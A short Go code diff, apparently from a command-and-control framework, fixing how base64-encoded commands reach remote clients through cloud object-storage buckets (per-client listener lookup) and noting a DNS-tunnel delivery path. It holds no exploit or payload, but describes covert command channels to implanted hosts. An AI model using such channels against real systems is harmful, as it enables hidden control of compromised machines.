@@ -384,7 +384,14 @@ func sendByProtocol(listenerType, uid string, byteToSend []byte, logCtx string) 
 			return
 		}
 		cmdBase64, _ := encrypt.EncodeBase64(cmdBytes)
-		oss.Send(oss.Service, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), cmdBase64)
+		// 按 uid 取回服务该客户端的 OSS 监听器：多监听器下不能再用全局 client
+		// （原 oss.Service 恒为最后初始化的那个，命令会被写进另一个桶）。
+		// 取不到说明监听器已停止或客户端从未上报，此时丢弃并告警，不要盲目投递。
+		if c := oss.ClientForUID(uid); c != nil {
+			oss.Send(c, uid+fmt.Sprintf("/server_%020d", time.Now().UnixNano()), cmdBase64)
+		} else {
+			logx.Warnf("⚠️ [OSS] 客户端 %s 未登记到任何 OSS 监听器，命令未下发（监听器可能已停止）\n", uid)
+		}
 
 	case "dns":
 		// DNS 隧道：命令放入队列，客户端轮询时取走（由 dns listener 的 handlePull 下发）
